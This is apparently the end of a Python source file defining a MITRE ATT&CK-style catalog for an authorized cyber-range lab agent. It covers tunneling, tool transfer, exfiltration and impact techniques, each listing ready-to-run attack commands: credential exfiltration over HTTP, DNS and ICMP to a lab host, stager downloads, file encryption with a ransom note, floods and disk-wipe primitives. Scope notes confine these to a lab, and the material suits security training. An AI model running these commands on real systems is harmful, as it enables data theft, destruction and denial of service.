      {
        "id": "T1572",
        "name": "Protocol Tunneling",
        "description": "Tunnel one protocol inside another authorized one (SSH, TLS, HTTP) to reach internal services or wrap an interactive session, hiding the true channel.",
        "typical_commands": [
          "ssh -N -L 8080:10.77.0.10:80 operator@10.77.0.5",
          "ssh -N -D 1080 operator@10.77.0.5",
          "sshuttle -r operator@10.77.0.5 10.77.0.0/24 --exclude 10.77.0.5",
          "chisel server -p 8443 --reverse --host 10.77.0.5"
        ],
        "scope_notes": "Tunnel endpoints must both lie within the authorized range and resolve to the named engagement target(s). Do not bridge the lab to the operator's real network or any external host, and do not pivot through targets outside scope."
      },
      {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "description": "Pull tools, scripts, or payloads into the compromised host from the C2 channel. The reverse direction also moves data back to the operator.",
        "typical_commands": [
          "curl -sk -o /tmp/stager https://10.77.0.5:443/tools/stager",
          "wget -q --no-check-certificate http://10.77.0.5:8080/linpeas.sh -O /tmp/lp.sh",
          "scp -P 22 /tmp/loot.tgz operator@10.77.0.5:/data/",
          "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://10.77.0.5:8080/a\",\"/tmp/a\")'"
        ],
        "scope_notes": "Source/sink must be the operator's authorized server; pull only small, named tool files needed for the engagement. Out of scope: downloading from the public internet, third-party hosts, or any host outside the engagement target set."
      }
    ]
  },
  {
    "id": "TA0010",
    "name": "Exfiltration",
    "phase": 12,
    "description": "Exfiltration (TA0010) covers the adversary's attempts to move data from a compromised host out of the target environment. In a Linux-network lab, this is the phase where the agent demonstrates collecting gathered loot (credentials, documents, captured traffic) and shipping it over an allowed egress channel to a controlled collection endpoint.",
    "guidance": "Treat the authorized scope's egress allowlist as the only permissible exit path: confirm the collection endpoint (the operator-owned C2/listener on the isolated lab network) before any transfer, and send only data already gathered under the engagement's objectives. Good execution looks like a single, deliberately small transfer (a few MB or less) to one verified host:port, using a channel the lab topology permits, so the act demonstrates capability without producing a high-volume data dump. Caution: do NOT exfiltrate over random third-party internet/cloud services, do NOT bulk-copy entire filesystems or databases, and never touch data outside the declared target host — confirm target and destination first, and keep volume minimal.",
    "techniques": [
      {
        "id": "T1041",
        "name": "Exfiltration Over C2 Channel",
        "description": "The adversary exfiltrates stolen data by encoding it and transmitting it out through the same channel already used for command-and-control, blending the egress with existing C2 traffic to avoid separate connections.",
        "typical_commands": [
          "echo -n \"loot://\"; tar czf - /tmp/gathered/ | base64 | curl -s --data-binary @- http://10.77.0.5:8443/upload",
          "tar czf - /tmp/gathered/ | openssl enc -aes-256-cbc -pbkdf2 -pass pass:s3cret | curl -s --data-binary @- http://10.77.0.5:8443/loot",
          "python3 -c \"import base64,sys,requests; requests.post('http://10.77.0.5:8443/c2', data=base64.b64encode(open('/tmp/gathered/creds.txt','rb').read()))\"",
          "cat /tmp/gathered/notes.txt | gzip | base64 -w0 | curl -s -X POST --data-binary @- http://10.77.0.5:8443/beacon"
        ],
        "scope_notes": "IN scope: a single transfer over the lab's existing operator-owned C2 channel to the confirmed C2 endpoint. OUT of scope: opening new connections to arbitrary external hosts, tunnelling unrelated protocol traffic, or exfiltrating data from any host outside the engagement scope."
      },
      {
        "id": "T1048",
        "name": "Exfiltration Over Alternative Protocol",
        "description": "The adversary exfiltrates data over a network protocol different from the established C2 channel — typically DNS, ICMP, HTTPS, or another protocol that is permitted through the target's egress filtering, to blend with normal traffic.",
        "typical_commands": [
          "tar czf - /tmp/gathered/ | base64 | tr -d '\\n' | fold -w 60 | while read c; do dig +short @10.77.0.5 \"$c\".exfil.lab; done",
          "tar czf - /tmp/gathered/ | base64 | gzip | curl -k --max-time 30 --data-binary @- https://10.77.0.5:443/collect",
          "python3 -c \"import base64,dns.resolver as r; d=open('/tmp/gathered/creds.txt','rb').read(); [r.resolve(p+'.exfil.lab','A') for p in [base64.b32encode(d[i:i+30]).decode().lower() for i in range(0,len(d),30)]]\"",
          "ping -c 1 -p $(head -c 16 /tmp/gathered/flag.txt | xxd -p) 10.77.0.5"
        ],
        "scope_notes": "IN scope: using an alternative protocol only toward the operator-controlled collection endpoint within the isolated lab network. OUT of scope: exfiltrating to public DNS resolvers, public paste/cloud services, or any destination not explicitly authorized for the engagement."
      },
      {
        "id": "T1048.002",
        "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
        "description": "The adversary exfiltrates data over an encrypted protocol such as HTTPS/TLS or SSH that is not the primary C2 channel, hiding the content of the transfer from network inspection while using a commonly allowed outbound service.",
        "typical_commands": [
          "tar czf - /tmp/gathered/ | curl -k --max-time 30 -X POST --data-binary @- https://10.77.0.5:8443/secure",
          "scp -o StrictHostKeyChecking=accept-new -P 2222 /tmp/gathered/creds.txt collector@10.77.0.5:/incoming/",
          "tar czf - /tmp/gathered/ | openssl s_client -quiet -connect 10.77.0.5:443 2>/dev/null",
          "rsync -e 'ssh -p 2222' /tmp/gathered/notes.txt collector@10.77.0.5:/incoming/"
        ],
        "scope_notes": "IN scope: an encrypted transfer to the operator-owned collection host on the lab network. OUT of scope: routing data through public web/cloud services or any host outside the authorized engagement target set."
      },
      {
        "id": "T1052",
        "name": "Exfiltration Over Physical Medium",
        "description": "The adversary transfers data out of the network by placing it onto a removable or otherwise portable medium, or by leveraging a shared/compromised host that can bridge an air-gapped or segmented environment.",
        "typical_commands": [
          "tar czf /mnt/labshare/loot_$(date +%s).tgz /tmp/gathered/",
          "cp /tmp/gathered/creds.txt /srv/export/incoming/ && sync",
          "mkdir -p /mnt/labshare/exfil && rsync -a /tmp/gathered/ /mnt/labshare/exfil/",
          "find /tmp/gathered -type f -exec cp {} /mnt/labshare/ \\;"
        ],
        "scope_notes": "IN scope: staging collected data into a designated lab share or mount bound for the operator-controlled host within the topology. OUT of scope: writing to arbitrary block devices, real removable hardware, or mounting/sharing systems outside the engagement scope."
      },
      {
        "id": "T1567",
        "name": "Exfiltration Over Web Service",
        "description": "The adversary exfiltrates data to an external web service such as a code repository, file-sharing, or cloud-storage site that is typically allowed out of the target network, using it as a staging/collection point.",
        "typical_commands": [
          "curl -k -X POST -F 'file=@/tmp/gathered/creds.txt' https://10.77.0.5/internal-drop/upload",
          "tar czf - /tmp/gathered/ | curl -k -H 'X-Token: labtoken' --data-binary @- https://10.77.0.5/internal-drop/collect",
          "python3 -c \"import requests; requests.post('https://10.77.0.5/internal-drop', files={'f':open('/tmp/gathered/flag.txt','rb')}, verify=False, timeout=30)\",",
          "wget --header='X-Token: labtoken' --post-file=/tmp/gathered/notes.txt https://10.77.0.5/internal-drop -O /dev/null"
        ],
        "scope_notes": "IN scope: posting data only to an operator-provided, engagement-authorized internal web endpoint. OUT of scope: using real public services (paste sites, public cloud storage, GitHub, file lockers) or any third-party web destination not explicitly approved for the lab."
      }
    ]
  },
  {
    "id": "TA0040",
    "name": "Impact",
    "phase": 13,
    "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data. Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes — destroying or tampering with data, encrypting systems for extortion, or exhausting resource availability (denial of service).",
    "guidance": "In an authorized cyber-range lab, Impact techniques are the final, most destructive step of a kill chain — execute them only against the single confirmed engagement target after objective approval, never as broad sweeps, and prefer reversible/simulated demonstrations (a one-off payload, a short-lived flood against one port) over sustained or permanently destructive actions. Confirm the target host/CIDR is the sanctioned range before issuing any command, and treat all data destruction, mass deletion, encryption, or resource exhaustion as high-risk: in a lab, demonstrate capability with a small proof-of-concept and explicitly avoid wiping shared range infrastructure, other tenants' hosts, or data that cannot be restored from snapshot.",
    "techniques": [
      {
        "id": "T1485",
        "name": "Data Destruction",
        "description": "The adversary overwrites, deletes, or otherwise destroys data on local and remote drives to interrupt availability, often as part of covering tracks or a destructive final-stage objective.",
        "typical_commands": [
          "touch /tmp/proof-of-impact-marker && rm /tmp/proof-of-impact-marker  # reversible capability demo",
          "find /home/target-user/labdata -maxdepth 1 -name '*.tmp' -delete  # scoped to lab scratch files only",
          "dd if=/dev/zero of=/mnt/lab_scratch/destroyed.bin bs=1M count=10  # overwrite a single lab scratch file",
          "shred -u -n 1 /mnt/lab_scratch/sample.txt"
        ],
        "scope_notes": "IN scope: demonstrating the capability against a single designated lab file or a clearly marked scratch directory on the engagement target. OUT of scope: rm -rf /, wiping whole filesystems, deleting shared lab infrastructure, other tenants' data, any host outside the confirmed target, or any data not restorable from a snapshot."
      },
      {
        "id": "T1486",
        "name": "Data Encrypted for Impact",
        "description": "Adversaries encrypt data on target systems to interrupt system availability and hold data hostage, typically for extortion (ransomware behavior).",
        "typical_commands": [
          "echo 'demo ransom note' > /mnt/lab_scratch/READ_ME.txt",
          "gpg --batch --passphrase 'labkey' --symmetric --cipher-algo AES256 /mnt/lab_scratch/sample.txt",
          "openssl enc -aes-256-cbc -salt -in /mnt/lab_scrack/sample.txt -out /mnt/lab_scratch/sample.txt.enc -pass pass:labkey",
          "find /mnt/lab_scratch -maxdepth 1 -name '*.txt' -exec cp {} {}.enc \\;  # simulate mass encryption on a scratch copy, originals untouched"
        ],
        "scope_notes": "IN scope: demonstrating the encryption primitive on a single small lab file or a copy of data within a designated scratch area on the engagement target. OUT of scope: encrypting entire directories, filesystems, or shared lab storage, deleting the originals after encryption, or operating outside the confirmed target host."
      },
      {
        "id": "T1499",
        "name": "Endpoint Denial of Service",
        "description": "Adversaries exhaust the target's process, network, or memory resources from a single or few systems to make the endpoint unavailable to legitimate users.",
        "typical_commands": [
          "for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code}\\n' --max-time 3 http://<target-ip>:80/; done  # short burst, bounded count",
          "ab -n 100 -c 10 -t 3 http://<target-ip>:80/  # capped request volume for a few seconds",
          "nc -w 2 -z <target-ip> 1-100  # brief single-host port-exhaustion demo, bounded range",
          "timeout 5 python3 -c \"import socket,sys; [socket.socket().connect(('<target-ip>',80)) for _ in range(50)]\""
        ],
        "scope_notes": "IN scope: a brief, bounded-duration, bounded-volume DoS demonstration against the single confirmed engagement target and one designated port/service. OUT of scope: sustained floods, high-rate volumetric attacks, targeting core lab routers/gateways, hitting hosts outside the engagement scope, or amplification/volumetric reflection."
      },
      {
        "id": "T1498.001",
        "name": "Network Denial of Service: Direct Network Flood",
        "description": "Adversaries send a high volume of packets directly from their own resources to saturate the target's network bandwidth or connection tables and deny service.",
        "typical_commands": [
          "ping -c 10 -s 100 -i 0.2 <target-ip>  # bounded ICMP count/rate to one target",
          "timeout 5 hping3 --flood --icmp -p 0 <target-ip> 2>/dev/null || echo 'hping3 not installed; using ping fallback'",
          "timeout 5 nc -u <target-ip> 12345 < /dev/zero  # short UDP flood against one port, capped",
          "iperf3 -c <target-ip> -u -b 10M -t 3  # bandwidth-saturation demo for a few seconds"
        ],
        "scope_notes": "IN scope: a short, rate-limited, time-bounded flood from a single lab host against the single confirmed engagement target to demonstrate capability. OUT of scope: amplified/reflected floods (DNS/NTP memcached), saturating shared lab uplinks, sustained attacks, or flooding any host outside the confirmed target."
      },
      {
        "id": "T1561.001",
        "name": "Disk Wipe: Storage Device Structure",
        "description": "Adversaries wipe or corrupt disk and partition structures (partition tables, boot sectors) to render storage devices unusable and prevent system recovery.",
        "typical_commands": [
          "echo 'simulated: would zero MBR of an unmounted lab loop device only'  # DO NOT point at real disks",
          "losetup -f  # identify an unused loop device for a contained lab demonstration",
          "dd if=/dev/zero of=/tmp/lab_disk.img bs=512 count=1  # zero a test image file, not a real device",
          "wipefs --all /dev/loop99 2>/dev/null || echo 'demo only: no real block device touched'"
        ],
        "scope_notes": "IN scope: demonstrating the primitive against a throwaway lab loop device or image file under the operator's control. OUT of scope: writing to any real block device (sdX/nvmeX), wiping partition tables or boot sectors of the engagement target's system disk, any host outside scope, or any device not explicitly dedicated as disposable lab media."
      },
      {
        "id": "T1529",
        "name": "System Shutdown/Reboot",
        "description": "Adversaries shut down or reboot systems to interrupt access, aid in executing malicious changes that require a restart, or cover tracks after destructive actions.",
        "typical_commands": [
          "echo 'would run: shutdown -r +1 (deferred, one target)'  # prefer simulated/announced",
          "ssh <target-user>@<target-ip> 'systemctl --dry-run reboot'  # verify what would run without executing",
          "at now + 1 minute <<< 'wall lab-impact-test: scheduled reboot demo'",
          "sudo -n systemctl reboot --dry-run 2>/dev/null || echo 'capability demo only, no real reboot issued'"
        ],
        "scope_notes": "IN scope: demonstrating or scheduling a shutdown/reboot capability against the single confirmed engagement target with prior coordination, preferring dry-run/deferred/announced variants. OUT of scope: abrupt shutdown of shared lab infrastructure, routers, or the range control plane, or rebooting any host outside the confirmed target."
      }
    ]
  }
]


def catalog() -> Dict[str, Any]:
    """Return the catalog in the API response shape (snake_case)."""
    return {"tactics": MITRE_TACTICS}
